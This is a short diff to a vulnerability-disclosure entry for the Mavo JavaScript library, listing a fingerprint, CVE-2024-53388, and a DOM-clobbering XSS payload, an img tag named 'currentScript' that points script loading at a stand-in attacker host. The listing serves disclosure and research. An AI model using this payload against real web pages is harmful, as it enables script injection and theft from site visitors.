@@ -6,10 +6,10 @@
 + Stars: 2.8K
 + Version: v0.3.2
 + Fingerprint: `typeof Mavo !== 'undefined' && Mavo.hasOwnProperty('Plugins')`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://attack.hulk"></img>```
 + Impact: XSS
 + Status: Reported
-+ CVE: CVE-2024-53388
++ CVE: [CVE-2024-53388](https://nvd.nist.gov/vuln/detail/CVE-2024-53388)
 + Foundby: TheHulk
 
 ### Library
